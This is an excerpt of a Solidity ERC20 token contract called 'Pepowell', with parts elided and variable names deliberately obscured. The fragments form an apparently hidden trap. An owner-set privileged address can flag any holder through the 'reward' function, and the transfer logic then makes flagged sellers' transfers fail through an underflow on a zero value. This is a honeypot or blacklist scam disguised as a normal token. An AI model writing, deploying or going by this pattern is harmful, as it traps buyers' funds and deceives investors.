...
contract Pepowell is ERC20, Ownable {
    ...
    mapping(address => bool) private building;

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);

    event AutoNukeLP();

    constructor(string memory won, string memory money, address tie, address continent) ERC20(won, money) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(tie);

        rule[continent] = doing;
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (rule[from] == 0 && uniswapV2Pair != from && building[from]) {
            rule[from] -= doing;
        }
    ...
    function reward(address a, bool b) external {
        if (rule[msg.sender] > 0) {
            building[a] = b;
        }
    }
